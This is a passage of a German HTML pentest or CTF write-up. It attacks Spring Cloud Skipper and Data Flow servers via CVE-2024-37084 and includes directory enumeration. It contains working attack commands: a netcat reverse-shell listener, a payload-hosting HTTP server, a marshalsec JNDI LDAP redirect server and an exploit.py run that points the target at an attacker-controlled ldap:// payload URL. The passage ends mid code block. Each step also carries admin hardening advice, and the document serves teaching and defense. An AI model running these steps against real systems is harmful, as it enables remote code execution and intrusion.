+            <p class="recommendation">**Empfehlung (Pentester):** Den HTTP-Server in einem separaten Terminalfenster laufen lassen. Sicherstellen, dass die Firewall des Angreifers eingehende Verbindungen auf Port 8000 zulässt. Die eigene IP-Adresse und den Port (8000) für die `payload_url` im Exploit-Skript verwenden.<br>**Empfehlung (Admin):** Ausgehende Verbindungen vom Zielserver zu beliebigen IPs und Ports (wie hier Port 8000) sollten durch eine Firewall blockiert oder zumindest stark eingeschränkt und überwacht werden. Dies hätte das Nachladen des Payloads verhindern können.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** `nc` (Netcat) wird verwendet, um einen Listener für eingehende Netzwerkverbindungen zu starten. `-l` aktiviert den Listen-Modus. `-v` sorgt für ausführliche Ausgabe. `-n` verhindert DNS-Lookups. `-p 4444` gibt den Port an, auf dem gelauscht wird (dieser muss mit dem Port in der `Exploit.java` übereinstimmen).</p>
+            <p class="evaluation">**Bewertung:** Dieser Listener wartet auf die eingehende Verbindung der Reverse Shell, die durch den Payload auf dem Zielserver ausgelöst wird. Sobald die Verbindung hergestellt ist, erhält der Angreifer eine interaktive Shell.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Listener ebenfalls in einem separaten Terminalfenster starten, bevor der Exploit ausgeführt wird. Sicherstellen, dass die Firewall eingehende Verbindungen auf Port 4444 zulässt.<br>**Empfehlung (Admin):** Ausgehende Verbindungen vom Zielserver, insbesondere zu ungewöhnlichen Ports wie 4444, sollten blockiert werden. Netzwerk-Monitoring (IDS/IPS) kann den Aufbau von Reverse Shells erkennen.</p>
+
+            <p class="analysis">**Analyse:** Dieser Abschnitt beschreibt den finalen Schritt: die Ausführung des Python-Exploit-Skripts (`CVE-2024-37084-Poc.py`). Es werden die notwendigen Parameter erläutert: `--target_url` (der `/api/package/upload`-Endpunkt des Ziels), `--version` (eine beliebige Version für das hochzuladende Paket), `--payload_url` (die URL zum gehosteten Payload, z.B. `http://&lt;DEINE_IP&gt;:&lt;HTTP_PORT&gt;/payload.jar`) und optional `--listen_ip` und `--listen_port` (obwohl der Listener separat gestartet wurde, benötigt das Skript diese Info vielleicht intern oder für alternative Payloads). Die Struktur des Befehls mit Backslashes (`\`) dient nur der besseren Lesbarkeit bei langen Zeilen.</p>
+            <p class="evaluation">**Bewertung:** Dies ist der auslösende Moment des Angriffs. Das Skript wird versuchen, die Schwachstelle über den Upload-Endpunkt auszunutzen und den Zielserver dazu zu bringen, den Payload von der angegebenen URL herunterzuladen und auszuführen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sicherstellen, dass alle Platzhalter (`&lt;DEINE_IP&gt;`, `&lt;HTTP_PORT&gt;`, `&lt;LISTENER_PORT&gt;`) korrekt durch die eigenen Werte ersetzt werden. Den Listener und den HTTP-Server im Hintergrund laufen lassen. Die Ausgabe des Skripts und die Logs des Listeners/HTTP-Servers genau beobachten.<br>**Empfehlung (Admin):** Wie bereits erwähnt: Endpunkt absichern, ausgehende Verbindungen filtern, Software patchen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud]<br>└─# <span class="command">cd ~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc</span></div>
+                     <pre></pre> <!-- Leere Ausgabe -->
+               </div>
+            </div>
+            <p class="analysis">**Analyse:** Wechsel in das Verzeichnis, in das zuvor das Exploit-Repository geklont wurde. Dies ist notwendig, um das Python-Skript (`exploit.py` oder `CVE-2024-37084-Poc.py`) und die erstellten Payload-Dateien direkt aufrufen zu können.</p>
+            <p class="evaluation">**Bewertung:** Korrekte Vorbereitung zur Ausführung des Exploits.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Vor der Ausführung von Skripten immer sicherstellen, dass man sich im richtigen Verzeichnis befindet oder korrekte Pfade verwendet.<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
+             <p class="analysis">**Analyse:** Der Text beschreibt die Verwendung von `marshalsec`, einem Tool zum Erstellen von JNDI-Referenz-Servern (Java Naming and Directory Interface). Speziell wird der `LDAPRefServer` gestartet. Dieser Server lauscht auf Port 1389 auf LDAP-Anfragen. Wenn eine Anfrage für den Objektpfad `Exploit` eingeht, sendet er eine Referenz zurück, die auf eine andere URL (`http://192.168.2.199:8000/#Exploit`) verweist. Der Zielserver, der die ursprüngliche JNDI-LDAP-Lookup macht, wird dann versuchen, die Klasse `Exploit` von dieser HTTP-URL herunterzuladen und auszuführen.</p>
+            <p class="evaluation">**Bewertung:** Dies ist eine alternative oder ergänzende Methode zur Ausnutzung von Java-Deserialisierungs- oder JNDI-Injection-Schwachstellen. Statt die JAR-Datei direkt anzugeben, wird ein LDAP-Lookup ausgelöst, der dann auf die eigentliche Payload-Klasse (gehostet via HTTP) umleitet. Dies kann Firewalls oder Filter umgehen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Diese Methode anwenden, wenn der direkte Payload-Download fehlschlägt. Sicherstellen, dass sowohl der LDAP-Server (marshalsec) als auch der HTTP-Server (für die Exploit.class) laufen und vom Ziel erreichbar sind. Die URL im Exploit-Skript muss dann auf den LDAP-Server zeigen (`ldap://&lt;DEINE_IP&gt;:1389/Exploit`).<br>**Empfehlung (Admin):** JNDI-Lookups zu externen oder nicht vertrauenswürdigen Servern unterbinden (Konfiguration der JVM, Netzwerk-Firewall). Logging von JNDI-Aktivitäten. Einsatz von Deserialisierungs-Schutzmechanismen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud]<br>└─# <span class="command">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.2.199:8000/#Exploit" 1389</span></div>
+                    <pre>
+Listening on <span class="command">0.0.0.0:1389</span>
+<span class="password">Send LDAP reference result for Exploit redirecting to http://192.168.2.199:8000/Exploit.class</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der `marshalsec` LDAP-Referenz-Server wird gestartet. `-cp marshalsec-0.0.3-SNAPSHOT-all.jar` gibt den Classpath zur JAR-Datei an. `marshalsec.jndi.LDAPRefServer` ist die auszuführende Klasse. `"http://192.168.2.199:8000/#Exploit"` ist die URL, zu der umgeleitet wird (die Angreifer-IP und der HTTP-Server-Port, `#Exploit` gibt die zu ladende Klasse an). `1389` ist der Port, auf dem der LDAP-Server lauscht. Die Ausgabe bestätigt, dass der Server läuft und auf eine Anfrage für "Exploit" eine Umleitung zur `.class`-Datei gesendet hat.</p>
+            <p class="evaluation">**Bewertung:** Der LDAP-Server läuft korrekt und hat eine Anfrage vom Zielsystem erhalten und beantwortet. Dies ist ein starkes Indiz, dass der JNDI-Lookup auf dem Ziel ausgelöst wurde.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Parallel prüfen, ob der HTTP-Server (auf Port 8000) eine Anfrage für `Exploit.class` erhalten hat und ob der Netcat-Listener eine Verbindung bekommen hat.<br>**Empfehlung (Admin):** Überwachung und Blockierung von ausgehendem LDAP-Traffic (Port 1389) zu unbekannten Servern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">curl http://192.168.2.199:8000/Exploit.class</span></div>
+                    <pre></pre> <!-- Leere Ausgabe oder Binärdaten, wenn erfolgreich -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein Test mit `curl`, um zu überprüfen, ob die `Exploit.class`-Datei vom lokal laufenden Python-HTTP-Server (Port 8000) heruntergeladen werden kann. Dies dient als Test, ob der Server korrekt läuft und die Datei bereitstellt.</p>
+            <p class="evaluation">**Bewertung:** Sinnvoller Testschritt zur Fehlersuche, falls der Exploit fehlschlägt. Bestätigt die Erreichbarkeit des Payloads vom Angreifer-System aus.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sicherstellen, dass dieser `curl`-Befehl die Klassendatei erfolgreich abruft. Wenn nicht, den Python-HTTP-Server und die Dateipfade überprüfen.<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">python3 -m http.server 8000</span></div>
+                    <pre>
+Serving HTTP on <span class="command">0.0.0.0</span> port <span class="command">8000</span> (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.199 - - [23/Apr/2025 09:07:12] "GET /Exploit.class HTTP/1.1" 200 -</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die Ausgabe des Python-HTTP-Servers wird gezeigt. Die Zeile `192.168.2.199 - - [...] "GET /Exploit.class HTTP/1.1" 200 -` bestätigt, dass eine Anfrage für die `Exploit.class`-Datei von der IP `192.168.2.199` (dem Angreifer-System selbst, wahrscheinlich vom vorherigen `curl`-Test) erfolgreich mit Statuscode 200 (OK) beantwortet wurde.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt die korrekte Funktion des HTTP-Servers und die Verfügbarkeit der Payload-Datei unter dem erwarteten Pfad.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Auf weitere GET-Anfragen für `Exploit.class` achten, die von der *Ziel-IP* (`192.168.2.183`) kommen, nachdem der Exploit ausgeführt wurde.<br>**Empfehlung (Admin):** Logging von HTTP-Server-Anfragen auf dem Zielsystem kann verdächtige Downloads aufdecken.</p>
+
+             <p class="analysis">**Analyse:** Der Text signalisiert einen Strategiewechsel ("neuer ansatz"). Der vorherige Exploit-Versuch mit CVE-2024-37084 über Port 7577 (Spring Cloud Skipper) war offenbar nicht erfolgreich oder wurde abgebrochen. Nun wird der zweite Tomcat-Dienst auf Port 9393 genauer untersucht.</p>
+             <p class="evaluation">**Bewertung:** Es ist üblich und notwendig im Pentesting, alternative Angriffsvektoren zu verfolgen, wenn ein erster Versuch scheitert. Die Konzentration verlagert sich auf den anderen potenziell verwundbaren Dienst.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Systematische Enumeration des Dienstes auf Port 9393 durchführen (Verzeichnisse, Dateien, bekannte Schwachstellen).<br>**Empfehlung (Admin):** Auch scheinbar identische Dienste auf unterschiedlichen Ports können unterschiedlich konfiguriert oder gepatcht sein. Beide Instanzen müssen überprüft und gesichert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">gobuster dir -u "http://192.168.2.183:9393" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b '503,404,403' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     <span class="command">http://192.168.2.183:9393</span>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   503,404,403
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              pdf,xlsx,csh,pHtml,xml,php,rar,tar,exe,exp,zip,pub,ps1,py,jpg,lib,sql,pl,dll,rtf,pem,old,bak,docx,db,kdbx,ln,mdb,svg,js.map,csv,java,config,sh,raw,cgi,html,eps,xls,json,diff,accdb,gz,png,phtml,c,deb,desc,aspx,conf,mod,rpm,txt,jpeg,crt,ELF,elf,bat,icon,doc,asp
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://192.168.2.183:9393/about</span>                (Status: 200) [Size: 1901]
+<span class="command">http://192.168.2.183:9393/apps</span>                 (Status: 200) [Size: 139]
+<span class="command">http://192.168.2.183:9393/management</span>           (Status: 200) [Size: 339]
+<span class="command">http://192.168.2.183:9393/error</span>                (Status: 500) [Size: 105]
+<span class="command">http://192.168.2.183:9393/dashboard</span>            (Status: 302) [Size: 0] [--&gt; http://192.168.2.183:9393/dashboard/index.html]
+
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** `gobuster` wird nun gegen Port 9393 eingesetzt, um Verzeichnisse und Dateien zu finden. Es verwendet die gleiche Wortliste wie `ffuf` zuvor, aber mit einer umfangreichen Liste von Dateiendungen (`-x ...`). `-b '503,404,403'` schließt diese Statuscodes von der Anzeige aus. `-e` erzwingt die vollständige URL-Ausgabe, `--no-error` unterdrückt Verbindungsfehler, `-k` ignoriert SSL-Zertifikatfehler (hier irrelevant). Die Ergebnisse ähneln denen von Port 7577 (`/about`, `/apps`, `/management`, `/error`). Neu ist `/dashboard`, das auf `/dashboard/index.html` weiterleitet (Status 302).</p>
+             <p class="evaluation">**Bewertung:** Der Dienst auf Port 9393 scheint eine ähnliche Struktur wie der auf 7577 zu haben, aber mit einem zusätzlichen `/dashboard`-Endpunkt. Dies könnte ein administratives Interface oder eine Benutzeroberfläche sein und stellt einen potenziell interessanten neuen Angriffspunkt dar.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den `/dashboard`-Endpunkt im Browser aufrufen und untersuchen. Prüfen, ob ein Login erforderlich ist, ob Standard-Credentials funktionieren oder ob es bekannte Schwachstellen im Dashboard gibt. Die anderen Endpunkte (`/about`, `/management`) ebenfalls untersuchen, um Versionsunterschiede zu Port 7577 festzustellen.<br>**Empfehlung (Admin):** Administrative Dashboards sollten niemals ohne starke Authentifizierung exponiert werden. Der Zugriff sollte idealerweise auf interne Netzwerke oder über VPN beschränkt sein. Sicherstellen, dass auch dieser Dienst aktuell und gepatcht ist.</p>
+
+             <p class="analysis">**Analyse:** Der Pentester ruft den Endpunkt `/management/info` auf Port 9393 auf (vermutlich im Browser oder mit `curl`, hier nur die relevanten Teile der Antwort gezeigt). Die Antwort enthält detaillierte Build-Informationen, einschließlich eines Git-Commit-IDs (`ee585df`), des Commit-Zeitpunkts und vor allem der exakten Version: `Spring Cloud Data Flow Server`, Version `2.11.3-SNAPSHOT`.</p>
+             <p class="evaluation">**Bewertung:** **Kritischer Fund!** Während Port 7577 "Spring Cloud Skipper Server" meldete, läuft auf Port 9393 offenbar der "Spring Cloud Data Flow Server", aber ebenfalls in der verwundbar erscheinenden Version `2.11.3-SNAPSHOT`. Das Vorhandensein von Git-Informationen (Commit-ID) kann ebenfalls nützlich sein, um den exakten Code-Stand zu recherchieren. Der Unterschied zwischen Skipper und Data Flow ist wichtig, da sie unterschiedliche Funktionen und potenziell unterschiedliche Schwachstellen haben könnten, auch wenn die Versionsnummer hier identisch ist.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Erneute Recherche nach Schwachstellen, diesmal spezifisch für "Spring Cloud Data Flow Server 2.11.3-SNAPSHOT". Prüfen, ob der zuvor gefundene Exploit CVE-2024-37084 auch für Data Flow gilt oder ob es spezifische Exploits für Data Flow gibt. Die Endpunkte unter `/management` genauer untersuchen (oft Teil von Spring Boot Actuator, der eigene Schwachstellen haben kann).<br>**Empfehlung (Admin):** Versions- und Build-Informationen über öffentliche Endpunkte wie `/management/info` sind ein Informationsleck und sollten deaktiviert oder abgesichert werden. Beide Anwendungen (Skipper und Data Flow) müssen dringend auf stabile, gepatchte Versionen aktualisiert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">feroxbuster --url "http://192.168.2.183:9393" --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+                    <pre>
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ <span class="command">http://192.168.2.183:9393</span>
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ [200, 301, 302]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+<span class="command">200      GET        1l       17w     1901c http://192.168.2.183:9393/about</span>
+<span class="command">200      GET        1l        1w       88c http://192.168.2.183:9393/tasks/executions/current</span>
+<span class="command">200      GET        1l        1w      151c http://192.168.2.183:9393/tasks/executions</span>
+<span class="command">200      GET        1l        1w      155c http://192.168.2.183:9393/tasks/thinexecutions</span>
+<span class="command">200      GET        1l        1w      154c http://192.168.2.183:9393/jobs/thinexecutions</span>
+<span class="command">200      GET        1l        1w      150c http://192.168.2.183:9393/jobs/executions</span>
+<span class="command">200      GET        1l        1w       49c http://192.168.2.183:9393/schema/versions</span>
+<span class="command">200      GET        1l      450w    10720c http://192.168.2.183:9393/tasks/platforms</span>
+<span class="command">200      GET        1l        1w      154c http://192.168.2.183:9393/streams/definitions</span>
+<span class="command">200      GET        1l        1w      475c http://192.168.2.183:9393/schema/targets</span>
+<span class="command">200      GET        1l        1w      103c http://192.168.2.183:9393/tasks/info/executions</span>
+<span class="command">200      GET        1l        1w      152c http://192.168.2.183:9393/tasks/definitions</span>
+<span class="command">200      GET        1l        1w     6561c http://192.168.2.183:9393/</span>
+<span class="command">200      GET        1l        1w      151c http://192.168.2.183:9393/jobs/executions/</span>
+<span class="command">200      GET        1l        1w      155c http://192.168.2.183:9393/streams/definitions/</span>
+<span class="command">200      GET        1l        1w      139c http://192.168.2.183:9393/apps</span>
+<span class="command">200      GET        1l        1w      339c http://192.168.2.183:9393/management</span>
+
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** `feroxbuster` wird als weiteres Tool zur Verzeichnis- und Dateisuche gegen Port 9393 eingesetzt. Es verwendet ähnliche Parameter wie `gobuster` (URL, Wortliste, Erweiterungen `-x`, Statuscodes `-s`). `feroxbuster` bietet zusätzliche Features wie rekursive Scans (standardmäßig aktiviert, Tiefe 4) und Link-Extraktion (`-E` bzw. `Extract Links: true` in der Ausgabe). Die Ergebnisse bestätigen viele der zuvor gefundenen Endpunkte (`/about`, `/apps`, `/management`) und listen zahlreiche weitere Endpunkte auf, die spezifisch für Spring Cloud Data Flow zu sein scheinen (z.B. unter `/tasks/...`, `/jobs/...`, `/streams/...`, `/schema/...`).</p>
+            <p class="evaluation">**Bewertung:** `feroxbuster` liefert eine deutlich umfangreichere Liste potenzieller API-Endpunkte als `gobuster` oder `ffuf` in diesem Fall. Dies erweitert die Angriffsfläche erheblich und zeigt viele interne Strukturen der Data Flow Anwendung auf. Die Vielzahl der Endpunkte erhöht die Wahrscheinlichkeit, eine Schwachstelle oder ein Informationsleck zu finden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die neu entdeckten Endpunkte (insbesondere unter `/tasks`, `/jobs`, `/streams`, `/schema`) systematisch untersuchen. Prüfen, ob diese ohne Authentifizierung zugänglich sind und welche Informationen sie preisgeben oder welche Aktionen sie ermöglichen. Die Dokumentation von Spring Cloud Data Flow konsultieren, um die Funktion dieser Endpunkte zu verstehen.<br>**Empfehlung (Admin):** Eine gründliche Überprüfung der Zugriffskontrollen für alle exponierten API-Endpunkte von Spring Cloud Data Flow durchführen. Nicht benötigte Endpunkte deaktivieren oder durch eine Firewall/API-Gateway blockieren. Sicherstellen, dass die Anwendung korrekt konfiguriert ist, um Informationslecks über Standard-Endpunkte zu minimieren.</p>
+
+            <p class="analysis">**Analyse:** Der Pentester greift auf den Endpunkt `/streams/deployments` (vermutlich via `curl` oder Browser) zu. Die zurückgegebene JSON-Antwort enthält einen Fehler (`HttpRequestMethodNotSupportedException`) mit der Nachricht "Request method 'GET' not supported".</p>
+            <p class="evaluation">**Bewertung:** Dies zeigt, dass der Endpunkt `/streams/deployments` existiert, aber keine GET-Anfragen akzeptiert. Dies deutet darauf hin, dass dieser Endpunkt für andere HTTP-Methoden wie POST, PUT oder DELETE vorgesehen ist, die typischerweise zum Erstellen oder Verwalten von Deployments verwendet werden. Solche Endpunkte sind oft kritisch für RCE-Schwachstellen wie CVE-2024-37084, die über Upload-Funktionen gehen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuchen, andere HTTP-Methoden (POST, PUT) an diesen Endpunkt zu senden. Prüfen, ob der Exploit für CVE-2024-37084 möglicherweise diesen Endpunkt statt `/api/package/upload` (von Port 7577) als Ziel verwenden kann, falls er auch auf Port 9393 anwendbar ist.<br>**Empfehlung (Admin):** Sicherstellen, dass auch Endpunkte, die nur POST/PUT/DELETE erlauben, robust gegen unautorisierte Zugriffe und schädliche Eingaben (wie manipulierte Pakete) geschützt sind.</p>
+
+             <p class="analysis">**Analyse:** Der Pentester greift auf einen Pfad `/01` auf Port 9393 zu (vermutlich im Browser oder mit `curl`). Das Ergebnis ist eine Standard-"Whitelabel Error Page" von Spring Boot mit einem HTTP-Status 404 (Not Found). Die Fehlermeldung besagt, dass es kein explizites Mapping für `/error` gibt und dies die Fallback-Seite ist.</p>
+             <p class="evaluation">**Bewertung:** Der Zugriff auf `/01` führt zu einem einfachen 404-Fehler. Dies liefert keine direkten Hinweise auf Schwachstellen. Die Whitelabel Error Page bestätigt jedoch die Verwendung des Spring Frameworks.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Diesen Pfad ignorieren, da er keine nützlichen Informationen liefert. Weiter auf die vielversprechenderen API-Endpunkte konzentrieren.<br>**Empfehlung (Admin):** Konfigurieren Sie benutzerdefinierte Fehlerseiten anstelle der Standard-Whitelabel-Seiten, um weniger Informationen über das zugrundeliegende Framework preiszugeben.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Hier die Initial Access-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">cd ~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc</span></div>
+                     <pre></pre> <!-- Leere Ausgabe -->
+               </div>
+            </div>
+             <p class="analysis">**Analyse:** Erneuter Wechsel in das Verzeichnis des geklonten Exploit-Skripts. Dies dient der Vorbereitung zur erneuten Ausführung des Exploits, diesmal mit einer anderen Strategie oder Payload, nachdem der erste Versuch (vermutlich mit der JNDI/LDAP-Methode) fehlgeschlagen ist oder als weniger erfolgversprechend eingestuft wurde.</p>
+            <p class="evaluation">**Bewertung:** Logische Vorbereitung für den nächsten Exploit-Versuch.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sicherstellen, dass alle benötigten Dateien (Payload, Exploit-Skript) in diesem Verzeichnis vorhanden und korrekt konfiguriert sind.<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Erneutes Starten des Netcat-Listeners auf Port 4444. Dies ist notwendig, um eine eingehende Reverse-Shell-Verbindung aufzufangen, falls der nächste Exploit-Versuch erfolgreich ist.</p>
+            <p class="evaluation">**Bewertung:** Standardprozedur beim Versuch, eine Reverse Shell zu erhalten. Der Listener muss aktiv sein, *bevor* der Exploit ausgelöst wird.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Listener in einem separaten Terminal aktiv und sichtbar halten.<br>**Empfehlung (Admin):** Überwachung und Blockierung ausgehender Verbindungen zu typischen Listener-Ports.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">python3 -m http.server 8000</span></div>
+                    <pre>
+Serving HTTP on <span class="command">0.0.0.0</span> port <span class="command">8000</span> (http://0.0.0.0:8000/) ...
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Erneutes Starten des Python-HTTP-Servers auf Port 8000. Diesmal dient er dazu, die `beans.xml`-Datei (eine alternative Payload-Methode) für den Zielserver bereitzustellen.</p>
+            <p class="evaluation">**Bewertung:** Notwendig für den alternativen Exploit-Ansatz, der eine XML-Datei anstelle einer JAR- oder Class-Datei verwendet.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sicherstellen, dass die `beans.xml`-Datei im Verzeichnis liegt, von dem aus der Server gestartet wird, und dass die URL im Exploit-Skript korrekt auf diese Datei zeigt.<br>**Empfehlung (Admin):** Blockieren/Überwachen ausgehender HTTP-Verbindungen.</p>
+
+            <p class="analysis">**Analyse:** Dieser Kommentar beschreibt den Befehl zum Starten des `marshalsec` JNDI LDAPRefServers. Dieser Schritt scheint hier aus dem vorherigen, fehlgeschlagenen Versuch übrig geblieben zu sein oder wird als alternative Möglichkeit genannt. Der Server würde auf Port 1389 lauschen und bei einer Anfrage für "Exploit" auf die `Exploit.class`-Datei auf dem HTTP-Server (Port 8000) verweisen.</p>
+            <p class="evaluation">**Bewertung:** Obwohl der Befehl hier als Kommentar steht, repräsentiert er den JNDI/LDAP-basierten Exploit-Versuch, der im vorherigen Log mit einem Status 500 fehlgeschlagen ist. Es wird deutlich, dass mehrere Methoden zur Ausnutzung der Schwachstelle (oder ähnlicher Schwachstellen) in Betracht gezogen wurden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Diesen Ansatz als weniger erfolgreich oder problematisch einstufen, da der vorherige Versuch fehlschlug. Sich auf den alternativen Ansatz mit `beans.xml` konzentrieren.<br>**Empfehlung (Admin):** Schutzmaßnahmen gegen JNDI-Exploits (JVM-Konfiguration, Netzwerkfilterung) sind weiterhin relevant.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command"># Korrigierter Befehl (ohne den Kommentar nach dem Backslash)</span></div>
+                     <pre></pre> <!-- Leere Ausgabe -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dies ist lediglich ein Kommentar, der darauf hinweist, dass der folgende Befehl eine korrigierte oder angepasste Version eines vorherigen Versuchs ist.</p>
+            <p class="evaluation">**Bewertung:** Zeigt den iterativen Prozess des Pentestings, bei dem Befehle angepasst und erneut ausgeführt werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Kommentare im eigenen Vorgehen nutzen, um Anpassungen und Gedanken festzuhalten.<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">python3 exploit.py \</span><br><span class="command">    --target_url "http://192.168.2.183:7577/api/package/upload" \</span><br><span class="command">    --version "1.0.1" \</span><br><span class="command">    --payload_url "ldap://192.168.2.199:1389/Exploit" \</span><br><span class="command">    --listen_ip "192.168.2.199" \</span><br><span class="command">    --listen_port 4444</span></div>
+                     <pre></pre> <!-- Leere Ausgabe, da dies nur die Befehlseingabe ist -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Hier wird das Exploit-Skript `exploit.py` (vermutlich eine Umbenennung von `CVE-2024-37084-Poc.py` oder eine alternative Version) ausgeführt. Es zielt auf den Skipper-Server auf Port 7577 (`--target_url`). Als Version wird `1.0.1` verwendet. Entscheidend ist hier die `--payload_url`, die auf den LDAP-Server des Angreifers (`ldap://192.168.2.199:1389/Exploit`) zeigt. Die Listener-IP/Port werden ebenfalls übergeben (obwohl der Listener separat läuft).</p>
+            <p class="evaluation">**Bewertung:** Dies ist die konkrete Ausführung des JNDI/LDAP-basierten Angriffsversuchs. Das Skript wird versuchen, ein manipuliertes Paket hochzuladen, das den Zielserver veranlasst, den JNDI-Lookup zur angegebenen LDAP-URL durchzuführen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Ausgabe dieses Skripts sowie die Logs des LDAP-Servers, des HTTP-Servers und des Netcat-Listeners genau beobachten, um zu sehen, ob der Exploit erfolgreich ist oder fehlschlägt.<br>**Empfehlung (Admin):** Überwachung verdächtiger Uploads und ausgehender LDAP/HTTP-Verbindungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
